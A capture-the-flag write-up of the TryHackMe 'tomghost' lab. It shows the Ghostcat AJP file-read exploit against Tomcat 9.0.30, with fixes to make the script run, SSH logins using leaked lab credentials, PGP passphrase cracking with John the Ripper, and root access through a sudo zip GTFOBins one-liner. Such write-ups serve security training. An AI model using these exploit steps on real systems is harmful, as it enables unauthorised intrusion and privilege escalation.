# Task 1: Flags
![[1 77.png]]
## Question
> Compromise this machine and obtain user.txt
- Let's run a `nmap` scan using the IP address.
```
$ nmap -sC -sV 10.10.106.51
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-13 19:55 IST
Nmap scan report for 10.10.106.51
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.95 seconds
```
- As we can see there are four open ports:
	- Port 22: SSH
	- Port 53: tcpwrapped
	- Port 8009: ajp13
	- Port 8080: http
- As we can see, the 8009 port is running AJP.
- Let's visit port 8080 through the browser.
![[2 77.png]]
- The version of Tomcat is`9.0.30`. This version is vulnerable to Ghostcat.
- We can find the exploit on the Exploit Database website.
![[3 59.png]]
- After downloading, we can run the exploit as follows:
```
$ python3 48143.py -p 8009 10.10.106.51
Traceback (most recent call last):
  File "/home/kunal/tryhackme/tomghost/48143.py", line 295, in <module>
    t = Tomcat(args.target, args.port)
  File "/home/kunal/tryhackme/tomghost/48143.py", line 262, in __init__
    self.stream = self.socket.makefile("rb", bufsize=0)
TypeError: socket.makefile() got an unexpected keyword argument 'bufsize'
```
- We need to change `busize` to `buffering` at line 262.
![[4 45.png]]
- Let's run it again.
```
$ python3 48143.py -p 8009 10.10.106.51
Getting resource at ajp13://10.10.106.51:8009/asdf
----------------------------
Traceback (most recent call last):
  File "/home/kunal/tryhackme/tomghost/48143.py", line 302, in <module>
    print("".join([d.data for d in data]))
TypeError: sequence item 0: expected str instance, bytes found
```
- We can fix this error by adding a `b` at line 302 before the `""`. This converts the string object into a byte object.
![[5 29.png]]
- Our exploit should run fine now.
```
$ python3 48143.py -p 8009 10.10.106.51
Getting resource at ajp13://10.10.106.51:8009/asdf
----------------------------
b'<?xml version="1.0" encoding="UTF-8"?>\n<!--\n Licensed to the Apache Software Foundation (ASF) under one or more\n  contributor license agreements.  See the NOTICE file distributed with\n  this work for additional information regarding copyright ownership.\n  The ASF licenses this file to You under the Apache License, Version 2.0\n  (the "License"); you may not use this file except in compliance with\n  the License.  You may obtain a copy of the License at\n\n      http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an "AS IS" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n  See the License for the specific language governing permissions and\n  limitations under the License.\n-->\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee\n                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"\n  version="4.0"\n  metadata-complete="true">\n\n  <display-name>Welcome to Tomcat</display-name>\n  <description>\n     Welcome to GhostCat\n\tskyfuck:8730281lkjlkjdqlksalks\n  </description>\n\n</web-app>\n\x00'
```
- So the username is `skyfuck` and the password is `8730281lkjlkjdqlksalks`.
- We can now use these credentials to login through SSH.
```
$ ssh skyfuck@10.10.106.51
The authenticity of host '10.10.106.51 (10.10.106.51)' can't be established.
ED25519 key fingerprint is SHA256:tWlLnZPnvRHCM9xwpxygZKxaf0vJ8/J64v9ApP8dCDo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.106.51' (ED25519) to the list of known hosts.
skyfuck@10.10.106.51's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

skyfuck@ubuntu:~$ 
```
- Let's look around for useful files.
```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```
- We need to copy these files to our local machine. We can do this using `scp`.
```
$ scp skyfuck@10.10.106.51:/home/skyfuck/* /home/kunal/tryhackme/tomghost/.
skyfuck@10.10.106.51's password: 
credential.pgp                                                                                                                                                                                            100%  394     1.4KB/s   00:00    
tryhackme.asc  
```
- Now using `gpg2john`, we can find the hash of the `tryhackme.asc` file.
```
$ gpg2john tryhackme.asc > asc_hash.txt

File tryhackme.asc
```
- Let's now use John the Ripper to find the password.
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt asc_hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2023-11-13 20:44) 1.694g/s 1820p/s 1820c/s 1820C/s alexandru..trisha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- Let's read the `tryhackme.asc` file using the password.
![[6 21.png]]
```
$ gpg --import tryhackme.asc           
gpg: keybox '/home/kunal/.gnupg/pubring.kbx' created
gpg: /home/kunal/.gnupg/trustdb.gpg: trustdb created
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```
- We can now decrypt the `credential.pgp` file.
```
$ gpg -d credential.pgp       
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j 
```
- Look like another user's credentials.
- Let's SSH login using `merlin` as the username and `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j` as the password.
```
$ ssh merlin@10.10.106.51                                                  
merlin@10.10.106.51's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Mar 10 22:56:49 2020 from 192.168.85.1
merlin@ubuntu:~$ 
```
- Let's `cat` the flag now.
```
merlin@ubuntu:~$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}
```
## Answer
```
THM{GhostCat_1s_so_cr4sy}
```
## Question
> Escalate privileges and obtain root.txt
- We need to look for sudo entries first.
```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
- Let's go to GTFObins to find some exploit.
![[7 16.png]]
- Let's use the exploit.
```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# 
```
- Looks like we have root privilege. We can verify that using the `id` command.
```
# id
uid=0(root) gid=0(root) groups=0(root)
```
- Let's cat the root flag.
```
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```
## Answer
```
THM{Z1P_1S_FAKE}
```